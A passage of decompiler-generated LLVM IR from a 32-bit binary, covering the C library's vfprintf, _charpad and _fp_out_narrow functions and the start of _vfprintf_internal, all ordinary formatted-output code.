  ret i32 %v5_805bb80

; uselistorder directives
  uselistorder i32 %v0_805bb7d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805bb7d, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805bb88 = load i32, i32* @edi, align 4
  %v0_805bb89 = load i32, i32* @esi, align 4
  %v0_805bb8a = load i32, i32* @ebx, align 4
  %v4_805bb8e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805bb8e, i32* @esi, align 4
  %v1_805bb92 = add i32 %v4_805bb8e, 52
  %v2_805bb92 = inttoptr i32 %v1_805bb92 to i32*
  %v3_805bb92 = load i32, i32* %v2_805bb92, align 4
  store i32 %v3_805bb92, i32* @edi, align 4
  %v1_805bb95 = icmp eq i32 %v3_805bb92, 0
  %v1_805bb97 = icmp eq i1 %v1_805bb95, false
  br i1 %v1_805bb97, label %dec_label_pc_805bbb8, label %dec_label_pc_805bb99

dec_label_pc_805bb99:                             ; preds = %entry
  %v1_805bb99 = add i32 %v4_805bb8e, 56
  store i32 %v1_805bb99, i32* @ebx, align 4
  %v5_805bba8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134585853, i32 %v1_805bb99)
  %v0_805bbad = load i32, i32* @ebx, align 4
  %v2_805bbb0 = call i32 @pthread_mutex_lock(i32 %v0_805bbad)
  %v0_805bbb8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bbb8

dec_label_pc_805bbb8:                             ; preds = %entry, %dec_label_pc_805bb99
  %v0_805bbce = phi i32 [ %v4_805bb8e, %entry ], [ %v0_805bbb8.pre, %dec_label_pc_805bb99 ]
  %v1_805bbb8 = inttoptr i32 %v0_805bbce to i16*
  %v2_805bbb8 = load i16, i16* %v1_805bbb8, align 2
  %v1_805bbbb = and i16 %v2_805bbb8, 192
  %v6_805bbc0 = icmp eq i16 %v1_805bbbb, 192
  br i1 %v6_805bbc0, label %dec_label_pc_805bbb8.dec_label_pc_805bbde_crit_edge, label %dec_label_pc_805bbc7

dec_label_pc_805bbb8.dec_label_pc_805bbde_crit_edge: ; preds = %dec_label_pc_805bbb8
  br label %dec_label_pc_805bbde

dec_label_pc_805bbc7:                             ; preds = %dec_label_pc_805bbb8
  %v0_805bbc7 = load i32, i32* @ecx, align 4
  %v6_805bbcf = call i32 @__stdio_trans2w_o(i16* %v1_805bbb8, i32 128, i32 %v0_805bbc7, i32 %v0_805bbc7)
  store i32 -1, i32* @ebx, align 4
  %v1_805bbda = icmp eq i32 %v6_805bbcf, 0
  %v1_805bbdc = icmp eq i1 %v1_805bbda, false
  br i1 %v1_805bbdc, label %dec_label_pc_805bbf2, label %dec_label_pc_805bbc7.dec_label_pc_805bbde_crit_edge

dec_label_pc_805bbc7.dec_label_pc_805bbde_crit_edge: ; preds = %dec_label_pc_805bbc7
  %v0_805bbe7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bbde

dec_label_pc_805bbde:                             ; preds = %dec_label_pc_805bbb8.dec_label_pc_805bbde_crit_edge, %dec_label_pc_805bbc7.dec_label_pc_805bbde_crit_edge
  %v0_805bbe7 = phi i32 [ %v0_805bbce, %dec_label_pc_805bbb8.dec_label_pc_805bbde_crit_edge ], [ %v0_805bbe7.pre, %dec_label_pc_805bbc7.dec_label_pc_805bbde_crit_edge ]
  %v0_805bbde = load i32, i32* @edx, align 4
  %v5_805bbe8 = inttoptr i32 %arg2 to i8*
  %v6_805bbe8 = call i32 @_vfprintf_internal(i32 %v0_805bbe7, i8* %v5_805bbe8, i32 %arg3, i32 %v0_805bbde)
  store i32 %v6_805bbe8, i32* @ebx, align 4
  br label %dec_label_pc_805bbf2

dec_label_pc_805bbf2:                             ; preds = %dec_label_pc_805bbc7, %dec_label_pc_805bbde
  %v0_805bc0a7 = phi i32 [ -1, %dec_label_pc_805bbc7 ], [ %v6_805bbe8, %dec_label_pc_805bbde ]
  br i1 %v1_805bb97, label %dec_label_pc_805bc07, label %dec_label_pc_805bbf6

dec_label_pc_805bbf6:                             ; preds = %dec_label_pc_805bbf2
  %v4_805bbff = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805bc0a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bc07

dec_label_pc_805bc07:                             ; preds = %dec_label_pc_805bbf2, %dec_label_pc_805bbf6
  %v0_805bc0a = phi i32 [ %v0_805bc0a7, %dec_label_pc_805bbf2 ], [ %v0_805bc0a.pre, %dec_label_pc_805bbf6 ]
  store i32 %v0_805bb8a, i32* @ebx, align 4
  store i32 %v0_805bb89, i32* @esi, align 4
  store i32 %v0_805bb88, i32* @edi, align 4
  ret i32 %v0_805bc0a

; uselistorder directives
  uselistorder i32 (i32, i8*, i32, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_805bc07, { 1, 0 }
  uselistorder label %dec_label_pc_805bbf2, { 1, 0 }
  uselistorder label %dec_label_pc_805bbde, { 1, 0 }
  uselistorder label %dec_label_pc_805bbb8, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_805bc10 = load i32, i32* @edi, align 4
  %v0_805bc11 = load i32, i32* @esi, align 4
  %v0_805bc12 = load i32, i32* @ebx, align 4
  %v0_805bc13 = load i32, i32* @eax, align 4
  store i32 %v0_805bc13, i32* @edi, align 4
  %v0_805bc18 = load i32, i32* @ecx, align 4
  store i32 %v0_805bc18, i32* @esi, align 4
  store i32 %v0_805bc18, i32* @ebx, align 4
  %v0_805bc1c = load i32, i32* @edx, align 4
  store i32 %v0_805bc1c, i32* %stack_var_-13, align 4
  %v1_805bc232 = icmp eq i32 %v0_805bc18, 0
  br i1 %v1_805bc232, label %dec_label_pc_805bc3b, label %dec_label_pc_805bc27.lr.ph

dec_label_pc_805bc27.lr.ph:                       ; preds = %entry
  %v2_805bc27 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_805bc27

dec_label_pc_805bc22:                             ; preds = %dec_label_pc_805bc27
  %v1_805bc22 = add i32 %v0_805bc22, -1
  %v8_805bc22 = icmp eq i32 %v1_805bc22, 0
  store i32 %v1_805bc22, i32* @ebx, align 4
  br i1 %v8_805bc22, label %dec_label_pc_805bc3b.loopexit, label %dec_label_pc_805bc22.dec_label_pc_805bc27_crit_edge

dec_label_pc_805bc22.dec_label_pc_805bc27_crit_edge: ; preds = %dec_label_pc_805bc22
  %v0_805bc2b.pre = load i32, i32* @edx, align 4
  %v0_805bc2c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805bc27

dec_label_pc_805bc27:                             ; preds = %dec_label_pc_805bc22.dec_label_pc_805bc27_crit_edge, %dec_label_pc_805bc27.lr.ph
  %v0_805bc2c = phi i32 [ %v0_805bc2c.pre, %dec_label_pc_805bc22.dec_label_pc_805bc27_crit_edge ], [ %v0_805bc13, %dec_label_pc_805bc27.lr.ph ]
  %v0_805bc2b = phi i32 [ %v0_805bc2b.pre, %dec_label_pc_805bc22.dec_label_pc_805bc27_crit_edge ], [ %v0_805bc1c, %dec_label_pc_805bc27.lr.ph ]
  %v4_805bc30 = call i32 @__stdio_fwrite(i32 %v2_805bc27, i32 1, i32 %v0_805bc2c, i32 %v0_805bc2b)
  %v8_805bc38 = icmp eq i32 %v4_805bc30, 1
  %v0_805bc22 = load i32, i32* @ebx, align 4
  br i1 %v8_805bc38, label %dec_label_pc_805bc22, label %dec_label_pc_805bc3b.loopexit

dec_label_pc_805bc3b.loopexit:                    ; preds = %dec_label_pc_805bc22, %dec_label_pc_805bc27
  %v1_805bc3b.ph = phi i32 [ %v0_805bc22, %dec_label_pc_805bc27 ], [ 0, %dec_label_pc_805bc22 ]
  %v0_805bc3b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bc3b

dec_label_pc_805bc3b:                             ; preds = %dec_label_pc_805bc3b.loopexit, %entry
  %v0_805bc3b = phi i32 [ 0, %entry ], [ %v0_805bc3b.pre, %dec_label_pc_805bc3b.loopexit ]
  %v1_805bc3b = phi i32 [ 0, %entry ], [ %v1_805bc3b.ph, %dec_label_pc_805bc3b.loopexit ]
  %v2_805bc3b = sub i32 %v0_805bc3b, %v1_805bc3b
  store i32 %v0_805bc12, i32* @ebx, align 4
  store i32 %v0_805bc11, i32* @esi, align 4
  store i32 %v0_805bc10, i32* @edi, align 4
  ret i32 %v2_805bc3b

; uselistorder directives
  uselistorder i32 %v1_805bc22, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_805bc3b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_805bc59 = trunc i32 %arg2 to i8
  %v5_805bc59 = icmp slt i8 %v3_805bc59, 0
  %v1_805bc5b = icmp eq i1 %v5_805bc59, false
  %tmp20 = ptrtoint i8* %arg4 to i32
  br i1 %v1_805bc5b, label %dec_label_pc_805bc8c, label %dec_label_pc_805bc5d

dec_label_pc_805bc5d:                             ; preds = %entry
  %v3_805bc64 = call i32 @strlen(i8* %arg4)
  %v0_805bc6c = load i32, i32* @ebx, align 4
  %v2_805bc6c = sub i32 %v0_805bc6c, %v3_805bc64
  store i32 %v2_805bc6c, i32* @ebx, align 4
  store i32 %v3_805bc64, i32* @esi, align 4
  %tmp22 = icmp slt i32 %v2_805bc6c, 1
  br i1 %tmp22, label %dec_label_pc_805bc8a, label %dec_label_pc_805bc74

dec_label_pc_805bc74:                             ; preds = %dec_label_pc_805bc5d
  %v0_805bc74 = load i32, i32* @edi, align 4
  %v1_805bc74 = urem i32 %v0_805bc74, 128
  store i32 %v1_805bc74, i32* @edi, align 4
  store i32 %v2_805bc6c, i32* @ecx, align 4
  store i32 %v1_805bc74, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_805bc7f = call i32 @_charpad()
  store i32 %v0_805bc7f, i32* @ebp, align 4
  %v12_805bc86 = icmp eq i32 %v0_805bc7f, %v2_805bc6c
  %v1_805bc88 = icmp eq i1 %v12_805bc86, false
  br i1 %v1_805bc88, label %dec_label_pc_805bca6, label %dec_label_pc_805bc74.dec_label_pc_805bc8a_crit_edge

dec_label_pc_805bc74.dec_label_pc_805bc8a_crit_edge: ; preds = %dec_label_pc_805bc74
  %v0_805bc8a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bc8a

dec_label_pc_805bc8a:                             ; preds = %dec_label_pc_805bc74.dec_label_pc_805bc8a_crit_edge, %dec_label_pc_805bc5d
  %v0_805bc8a = phi i32 [ %v0_805bc8a.pre, %dec_label_pc_805bc74.dec_label_pc_805bc8a_crit_edge ], [ %v3_805bc64, %dec_label_pc_805bc5d ]
  store i32 %v0_805bc8a, i32* @ebx, align 4
  br label %dec_label_pc_805bc8c

dec_label_pc_805bc8c:                             ; preds = %entry, %dec_label_pc_805bc8a
  %v0_805bc97 = phi i32 [ %arg3, %entry ], [ %v0_805bc8a, %dec_label_pc_805bc8a ]
  %tmp23 = icmp slt i32 %v0_805bc97, 1
  br i1 %tmp23, label %dec_label_pc_805bca4, label %dec_label_pc_805bc92

dec_label_pc_805bc92:                             ; preds = %dec_label_pc_805bc8c
  %v0_805bc92 = load i32, i32* @ecx, align 4
  %v5_805bc9c = call i32 @__stdio_fwrite(i32 %tmp20, i32 %v0_805bc97, i32 %arg1, i32 %v0_805bc92)
  br label %dec_label_pc_805bca4

dec_label_pc_805bca4:                             ; preds = %dec_label_pc_805bc8c, %dec_label_pc_805bc92
  %v1_805bca4 = phi i32 [ 0, %dec_label_pc_805bc8c ], [ %v5_805bc9c, %dec_label_pc_805bc92 ]
  %v0_805bca4 = load i32, i32* @ebp, align 4
  %v2_805bca4 = add i32 %v0_805bca4, %v1_805bca4
  br label %dec_label_pc_805bca6

dec_label_pc_805bca6:                             ; preds = %dec_label_pc_805bc74, %dec_label_pc_805bca4
  %v0_805bca9 = phi i32 [ %v0_805bc7f, %dec_label_pc_805bc74 ], [ %v2_805bca4, %dec_label_pc_805bca4 ]
  ret i32 %v0_805bca9

; uselistorder directives
  uselistorder i32 %v0_805bc97, { 1, 0 }
  uselistorder i32 %v0_805bc7f, { 1, 0, 2 }
  uselistorder i32 %v1_805bc74, { 1, 0 }
  uselistorder i32 %v2_805bc6c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805bca6, { 1, 0 }
  uselistorder label %dec_label_pc_805bca4, { 1, 0 }
  uselistorder label %dec_label_pc_805bc8c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_805bcba = ptrtoint i8* %arg2 to i32
  store i32 %v4_805bcba, i32* @ebx, align 4
  %v2_805bcc2 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_805bcc2, i32* @esi, align 4
  %v5_805bcc7 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805bcba)
  store i32 %v5_805bcc7, i32* %eax.global-to-local, align 4
  %v2_805bccf = icmp slt i32 %v5_805bcc7, 0
  %v1_805bcd1 = icmp eq i1 %v2_805bccf, false
  br i1 %v1_805bcd1, label %dec_label_pc_805bd11, label %dec_label_pc_805bcd3

dec_label_pc_805bcd3:                             ; preds = %entry
  %v3_805bcd3 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_805bcd3, i32* @ebx, align 4
  %v5_805bcda = inttoptr i32 %v3_805bcd3 to i8*
  %v3_805bcdb = call i32 @strlen(i8* %v5_805bcda)
  store i32 %v3_805bcdb, i32* %eax.global-to-local, align 4
  %v1_805bce3 = icmp eq i32 %v3_805bcdb, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_805bce3, label %dec_label_pc_805c24a, label %dec_label_pc_805bcf2

dec_label_pc_805bcf2:                             ; preds = %dec_label_pc_805bcd3
  %v0_805bcf2 = load i32, i32* @edx, align 4
  %v0_805bcfb = load i32, i32* @ebx, align 4
  %v6_805bcfc = call i32 @__stdio_fwrite(i32 %v0_805bcfb, i32 %v3_805bcdb, i32 %arg1, i32 %v0_805bcf2)
  store i32 %v6_805bcfc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_805c24a

dec_label_pc_805bd11:                             ; preds = %entry
  %v6_805bd1b = call i32 @_ppfs_prepargs(i32 %v2_805bcc2, i32 %arg3, i32 %v5_805bcc7, i32 %v5_805bcc7)
  store i32 %v6_805bd1b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_805bd28 = load i32, i32* @ebx, align 4
  store i32 %v0_805bd28, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805bd30

dec_label_pc_805bd2f:                             ; preds = %dec_label_pc_805bd36
  %v1_805bd2f = add i32 %v0_805bd3e, 1
  store i32 %v1_805bd2f, i32* @ebx, align 4
  br label %dec_label_pc_805bd30.backedge

dec_label_pc_805bd30.backedge:                    ; preds = %dec_label_pc_805bd2f, %dec_label_pc_805c230, %dec_label_pc_805c23b
  %v1_805bd3a19 = phi i32 [ %v1_805bd42, %dec_label_pc_805bd2f ], [ %v3_805c230, %dec_label_pc_805c230 ], [ %v1_805bd6e, %dec_label_pc_805c23b ]
  %v0_805bd3017 = phi i32 [ %v1_805bd2f, %dec_label_pc_805bd2f ], [ %v3_805c230, %dec_label_pc_805c230 ], [ %v1_805c23b, %dec_label_pc_805c23b ]
  %v4_805bd30.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805bd30

dec_label_pc_805bd30:                             ; preds = %dec_label_pc_805bd30.backedge, %dec_label_pc_805bd11
  %v1_805bd42 = phi i32 [ %v1_805bd3a19, %dec_label_pc_805bd30.backedge ], [ %v0_805bd28, %dec_label_pc_805bd11 ]
  %v0_805bd3e = phi i32 [ %v0_805bd3017, %dec_label_pc_805bd30.backedge ], [ %v0_805bd28, %dec_label_pc_805bd11 ]
  %v4_805bd30 = phi i32 [ %v4_805bd30.pre, %dec_label_pc_805bd30.backedge ], [ %v6_805bd1b, %dec_label_pc_805bd11 ]
  %v1_805bd30 = inttoptr i32 %v0_805bd3e to i8*
  %v2_805bd30 = load i8, i8* %v1_805bd30, align 1
  %v3_805bd30 = zext i8 %v2_805bd30 to i32
  %v5_805bd30 = and i32 %v4_805bd30, -256
  %v6_805bd30 = or i32 %v3_805bd30, %v5_805bd30
  store i32 %v6_805bd30, i32* %eax.global-to-local, align 4
  %v4_805bd32 = icmp eq i8 %v2_805bd30, 0
  br i1 %v4_805bd32, label %dec_label_pc_805bd3a, label %dec_label_pc_805bd36

dec_label_pc_805bd36:                             ; preds = %dec_label_pc_805bd30
  %v10_805bd36 = icmp eq i8 %v2_805bd30, 37
  %v1_805bd38 = icmp eq i1 %v10_805bd36, false
  br i1 %v1_805bd38, label %dec_label_pc_805bd2f, label %dec_label_pc_805bd3a

dec_label_pc_805bd3a:                             ; preds = %dec_label_pc_805bd36, %dec_label_pc_805bd30
  %v2_805bd3a = sub i32 %v0_805bd3e, %v1_805bd42
  %v12_805bd3a = icmp eq i32 %v2_805bd3a, 0
  br i1 %v12_805bd3a, label %dec_label_pc_805bd65, label %dec_label_pc_805bd3e

dec_label_pc_805bd3e:                             ; preds = %dec_label_pc_805bd3a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805bd3a, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_805bd3a, 1
  br i1 %tmp66, label %dec_label_pc_805bd5a, label %dec_label_pc_805bd48

dec_label_pc_805bd48:                             ; preds = %dec_label_pc_805bd3e
  %v0_805bd48 = load i32, i32* @ebp, align 4
  %v1_805bd48 = load i32, i32* @esp, align 4
  %v2_805bd48 = add i32 %v1_805bd48, -4
  %v3_805bd48 = inttoptr i32 %v2_805bd48 to i32*
  store i32 %v0_805bd48, i32* %v3_805bd48, align 4
  %v1_805bd49 = add i32 %v1_805bd48, 368
  %v2_805bd49 = inttoptr i32 %v1_805bd49 to i32*
  %v3_805bd49 = load i32, i32* %v2_805bd49, align 4
  %v5_805bd49 = add i32 %v1_805bd48, -8
  %v6_805bd49 = inttoptr i32 %v5_805bd49 to i32*
  store i32 %v3_805bd49, i32* %v6_805bd49, align 4
  %v0_805bd50 = load i32, i32* @esi, align 4
  %v2_805bd50 = add i32 %v1_805bd48, -12
  %v3_805bd50 = inttoptr i32 %v2_805bd50 to i32*
  store i32 %v0_805bd50, i32* %v3_805bd50, align 4
  %v0_805bd51 = load i32, i32* %edx.global-to-local, align 4
  %v2_805bd51 = add i32 %v1_805bd48, -16
  %v3_805bd51 = inttoptr i32 %v2_805bd51 to i32*
  store i32 %v0_805bd51, i32* %v3_805bd51, align 4
  %v0_805bd52 = load i32, i32* %stack_var_-364, align 4
  %v4_805bd52 = call i32 @__stdio_fwrite(i32 %v0_805bd52, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805bd52, i32* %eax.global-to-local, align 4
  %v1_805bd5a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bd5a

dec_label_pc_805bd5a:                             ; preds = %dec_label_pc_805bd3e, %dec_label_pc_805bd48
  %v3_805bd62 = phi i32 [ %v2_805bd3a, %dec_label_pc_805bd3e ], [ %v1_805bd5a.pre, %dec_label_pc_805bd48 ]
  %v0_805bd5a = phi i32 [ 0, %dec_label_pc_805bd3e ], [ %v4_805bd52, %dec_label_pc_805bd48 ]
  %v12_805bd5a = icmp eq i32 %v0_805bd5a, %v3_805bd62
  %v1_805bd5c = icmp eq i1 %v12_805bd5a, false
  %v0_805c243.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_805bd5c, label %dec_label_pc_805c243, label %dec_label_pc_805bd62

dec_label_pc_805bd62:                             ; preds = %dec_label_pc_805bd5a
  %v1_805bd62 = inttoptr i32 %v0_805c243.pre.pre to i32*
  %v2_805bd62 = load i32, i32* %v1_805bd62, align 4
  %v4_805bd62 = add i32 %v2_805bd62, %v3_805bd62
  store i32 %v4_805bd62, i32* %v1_805bd62, align 4
  %v0_805bd65.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bd65

dec_label_pc_805bd65:                             ; preds = %dec_label_pc_805bd3a, %dec_label_pc_805bd62
  %v0_805c23b = phi i32 [ %v0_805bd3e, %dec_label_pc_805bd3a ], [ %v0_805bd65.pre, %dec_label_pc_805bd62 ]
  %v1_805bd65 = inttoptr i32 %v0_805c23b to i8*
  %v2_805bd65 = load i8, i8* %v1_805bd65, align 1
  %v3_805bd65 = icmp eq i8 %v2_805bd65, 0
  br i1 %v3_805bd65, label %dec_label_pc_805c24a, label %dec_label_pc_805bd6e

dec_label_pc_805bd6e:                             ; preds = %dec_label_pc_805bd65
  %v1_805bd6e = add i32 %v0_805c23b, 1
  store i32 %v1_805bd6e, i32* %edx.global-to-local, align 4
  %v2_805bd71 = inttoptr i32 %v1_805bd6e to i8*
  %v3_805bd71 = load i8, i8* %v2_805bd71, align 1
  %v12_805bd71 = icmp eq i8 %v3_805bd71, 37
  br i1 %v12_805bd71, label %dec_label_pc_805c23b, label %dec_label_pc_805bd7b

dec_label_pc_805bd7b:                             ; preds = %dec_label_pc_805bd6e
  %v1_805bd7b = load i32, i32* @esp, align 4
  %v2_805bd7b = add i32 %v1_805bd7b, 16
  %v3_805bd7b = inttoptr i32 %v2_805bd7b to i32*
  store i32 %v1_805bd6e, i32* %v3_805bd7b, align 4
  %v0_805bd7f = load i32, i32* @esp, align 4
  %v1_805bd7f = add i32 %v0_805bd7f, 340
  %v2_805bd7f = inttoptr i32 %v1_805bd7f to i32*
  store i32 0, i32* %v2_805bd7f, align 4
  %v0_805bd8a = load i32, i32* @esp, align 4
  %v1_805bd8d = add i32 %v0_805bd8a, 16
  store i32 %v1_805bd8d, i32* @ebx, align 4
  %v2_805bd91 = add i32 %v0_805bd8a, -16
  %v3_805bd91 = inttoptr i32 %v2_805bd91 to i32*
  store i32 %v1_805bd8d, i32* %v3_805bd91, align 4
  %v0_805bd92 = load i32, i32* %stack_var_-364, align 4
  %v1_805bd92 = inttoptr i32 %v0_805bd92 to i32*
  %v2_805bd92 = call i32 @_ppfs_parsespec(i32* %v1_805bd92)
  store i32 %v2_805bd92, i32* %eax.global-to-local, align 4
  %v0_805bd97 = load i32, i32* @ebx, align 4
  %v1_805bd97 = load i32, i32* @esp, align 4
  %v2_805bd97 = inttoptr i32 %v1_805bd97 to i32*
  store i32 %v0_805bd97, i32* %v2_805bd97, align 4
  %v0_805bd9a = load i32, i32* %stack_var_-364, align 4
  %v1_805bd9a = call i32 @_ppfs_setargs(i32 %v0_805bd9a)
  store i32 %v1_805bd9a, i32* %eax.global-to-local, align 4
  %v0_805bd9f = load i32, i32* @esp, align 4
  %v1_805bd9f = add i32 %v0_805bd9f, 70
  %v2_805bd9f = inttoptr i32 %v1_805bd9f to i8*
  %v3_805bd9f = load i8, i8* %v2_805bd9f, align 1
  %v4_805bd9f = zext i8 %v3_805bd9f to i32
  store i32 %v4_805bd9f, i32* @edi, align 4
  %v1_805bda4 = add i32 %v0_805bd9f, 16
  %v1_805bda7 = add i32 %v0_805bd9f, 56
  %v2_805bda7 = inttoptr i32 %v1_805bda7 to i32*
  %v3_805bda7 = load i32, i32* %v2_805bda7, align 4
  %v1_805bdac = add i32 %v0_805bd9f, 112
  store i32 %v1_805bdac, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_805bda7, 1
  br i1 %tmp67, label %dec_label_pc_805bdb9, label %dec_label_pc_805bdb2

dec_label_pc_805bdb2:                             ; preds = %dec_label_pc_805bd7b
  %v2_805bdb2 = zext i8 %v3_805bd9f to i32
  %v3_805bdb2 = mul nuw nsw i32 %v2_805bdb2, 12
  store i32 %v3_805bdb2, i32* %eax.global-to-local, align 4
  %v2_805bdb5 = add i32 %v0_805bd9f, 100
  %v3_805bdb5 = add i32 %v2_805bdb5, %v3_805bdb2
  store i32 %v3_805bdb5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805bdb9

dec_label_pc_805bdb9:                             ; preds = %dec_label_pc_805bd7b, %dec_label_pc_805bdb2
  %v0_805bdc127 = phi i32 [ %v1_805bdac, %dec_label_pc_805bd7b ], [ %v3_805bdb5, %dec_label_pc_805bdb2 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805bdbb = add i32 %v0_805bd9f, 60
  %v2_805bdbb = inttoptr i32 %v1_805bdbb to i32*
  %v3_805bdbb = load i32, i32* %v2_805bdbb, align 4
  store i32 %v3_805bdbb, i32* %ecx.global-to-local, align 4
  %v2_805bdcc72 = sub i32 0, %v3_805bdbb
  %v10_805bdcc75 = and i32 %v3_805bdbb, %v2_805bdcc72
  %v11_805bdcc76 = icmp slt i32 %v10_805bdcc75, 0
  %v13_805bdcc77 = icmp slt i32 %v2_805bdcc72, 0
  %v2_805bdce78 = icmp eq i1 %v13_805bdcc77, %v11_805bdcc76
  br i1 %v2_805bdce78, label %dec_label_pc_805bdd0, label %dec_label_pc_805bdc1

dec_label_pc_805bdc1:                             ; preds = %dec_label_pc_805bdb9, %dec_label_pc_805bdc1
  %v0_805bdd082 = phi i32 [ %v0_805bdd0, %dec_label_pc_805bdc1 ], [ %v1_805bda4, %dec_label_pc_805bdb9 ]
  %v2_805bdc181 = phi i32 [ %v1_805bdcb, %dec_label_pc_805bdc1 ], [ 0, %dec_label_pc_805bdb9 ]
  %v0_805bdc180 = phi i32 [ %v1_805bdc8, %dec_label_pc_805bdc1 ], [ %v0_805bdc127, %dec_label_pc_805bdb9 ]
  %v3_805bdc1 = mul i32 %v2_805bdc181, 4
  %v4_805bdc1 = add i32 %v0_805bdd082, 344
  %v5_805bdc1 = add i32 %v4_805bdc1, %v3_805bdc1
  %v6_805bdc1 = inttoptr i32 %v5_805bdc1 to i32*
  store i32 %v0_805bdc180, i32* %v6_805bdc1, align 4
  %v0_805bdc8 = load i32, i32* %edx.global-to-local, align 4
  %v1_805bdc8 = add i32 %v0_805bdc8, 12
  store i32 %v1_805bdc8, i32* %edx.global-to-local, align 4
  %v0_805bdcb = load i32, i32* %eax.global-to-local, align 4
  %v1_805bdcb = add i32 %v0_805bdcb, 1
  store i32 %v1_805bdcb, i32* %eax.global-to-local, align 4
  %v1_805bdcc.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_805bdcc = sub i32 %v1_805bdcb, %v1_805bdcc.pre
  %v8_805bdcc = xor i32 %v1_805bdcb, %v1_805bdcc.pre
  %v9_805bdcc = xor i32 %v2_805bdcc, %v1_805bdcb
  %v10_805bdcc = and i32 %v9_805bdcc, %v8_805bdcc
  %v11_805bdcc = icmp slt i32 %v10_805bdcc, 0
  %v13_805bdcc = icmp slt i32 %v2_805bdcc, 0
  %v2_805bdce = icmp eq i1 %v13_805bdcc, %v11_805bdcc
  %v0_805bdd0 = load i32, i32* @esp, align 4
  br i1 %v2_805bdce, label %dec_label_pc_805bdd0, label %dec_label_pc_805bdc1

dec_label_pc_805bdd0:                             ; preds = %dec_label_pc_805bdc1, %dec_label_pc_805bdb9
  %v0_805bdd0.lcssa = phi i32 [ %v1_805bda4, %dec_label_pc_805bdb9 ], [ %v0_805bdd0, %dec_label_pc_805bdc1 ]
  %v1_805bdd0 = add i32 %v0_805bdd0.lcssa, 48
  %v2_805bdd0 = inttoptr i32 %v1_805bdd0 to i32*
  %v3_805bdd0 = load i32, i32* %v2_805bdd0, align 4
  store i32 %v3_805bdd0, i32* @ecx, align 4
  %v1_805bdd4 = icmp eq i32 %v3_805bdd0, 0
  %v1_805bdd6 = icmp eq i1 %v1_805bdd4, false
  br i1 %v1_805bdd6, label %dec_label_pc_805bdfe, label %dec_label_pc_805bdd8

dec_label_pc_805bdd8:                             ; preds = %dec_label_pc_805bdd0
  %v1_805bdd8 = inttoptr i32 %v0_805bdd0.lcssa to i32*
  %v2_805bdd8 = load i32, i32* %v1_805bdd8, align 4
  store i32 %v2_805bdd8, i32* %eax.global-to-local, align 4
  %v1_805bddb = ashr i32 %v2_805bdd8, 31
  store i32 %v1_805bddb, i32* %edx.global-to-local, align 4
  %v2_805bddc = add i32 %v0_805bdd0.lcssa, -4
  %v3_805bddc = inttoptr i32 %v2_805bddc to i32*
  store i32 %v1_805bddb, i32* %v3_805bddc, align 4
  %v0_805bddd = load i32, i32* %eax.global-to-local, align 4
  %v2_805bddd = add i32 %v0_805bdd0.lcssa, -8
  %v3_805bddd = inttoptr i32 %v2_805bddd to i32*
  store i32 %v0_805bddd, i32* %v3_805bddd, align 4
  %v1_805bdde = add i32 %v0_805bdd0.lcssa, 32
  %v2_805bdde = inttoptr i32 %v1_805bdde to i32*
  %v3_805bdde = load i32, i32* %v2_805bdde, align 4
  %v1_805bde2 = and i32 %v3_805bdde, 3840
  store i32 %v1_805bde2, i32* %eax.global-to-local, align 4
  %v2_805bde7 = add i32 %v0_805bdd0.lcssa, -12
  %v3_805bde7 = inttoptr i32 %v2_805bde7 to i32*
